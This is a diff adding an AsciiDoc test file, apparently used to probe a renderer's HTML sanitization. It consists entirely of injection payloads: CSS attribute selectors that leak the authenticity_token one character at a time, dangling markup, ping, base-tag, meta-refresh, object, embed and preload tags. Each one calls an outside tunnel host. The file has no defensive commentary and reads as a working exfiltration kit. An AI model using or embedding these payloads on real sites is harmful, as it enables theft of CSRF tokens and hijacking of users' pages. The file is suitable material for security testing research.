@@ -1,0 +1,44 @@
+= Style Exfil Test
+
+++++
+<style>
+body { background: red !important; }
+input[name="authenticity_token"][value^="a"] { background-image: url(https://global.rel.tunnels.api.visualstudio.com/css/a) }
+input[name="authenticity_token"][value^="b"] { background-image: url(https://global.rel.tunnels.api.visualstudio.com/css/b) }
+</style>
+++++
+
+Dangling markup test:
+++++
+<a href="https://global.rel.tunnels.api.visualstudio.com/dangle?steal=
+++++
+
+Ping test:
+++++
+<a href="https://github.com" ping="https://global.rel.tunnels.api.visualstudio.com/ping">Click for ping</a>
+++++
+
+Base tag hijack:
+++++
+<base href="https://global.rel.tunnels.api.visualstudio.com/">
+++++
+
+Meta refresh:
+++++
+<meta http-equiv="refresh" content="0;url=https://global.rel.tunnels.api.visualstudio.com/meta?
+++++
+
+Object tag:
+++++
+<object data="https://global.rel.tunnels.api.visualstudio.com/object"></object>
+++++
+
+Embed tag:
+++++
+<embed src="https://global.rel.tunnels.api.visualstudio.com/embed">
+++++
+
+Link preload:
+++++
+<link rel="preload" href="https://global.rel.tunnels.api.visualstudio.com/preload" as="fetch">
+++++
